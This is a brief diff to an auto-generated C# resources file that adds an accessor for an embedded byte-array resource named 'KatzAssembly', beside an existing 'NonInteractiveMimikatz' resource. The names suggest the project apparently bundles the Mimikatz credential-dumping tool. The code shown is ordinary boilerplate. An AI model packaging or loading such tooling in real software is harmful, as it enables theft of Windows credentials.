@@ -63,6 +63,16 @@ namespace NewApproach.Properties {
         /// <summary>
         ///   Поиск локализованного ресурса типа System.Byte[].
         /// </summary>
+        internal static byte[] KatzAssembly {
+            get {
+                object obj = ResourceManager.GetObject("KatzAssembly", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Поиск локализованного ресурса типа System.Byte[].
+        /// </summary>
         internal static byte[] NonInteractiveMimikatz {
             get {
                 object obj = ResourceManager.GetObject("NonInteractiveMimikatz", resourceCulture);
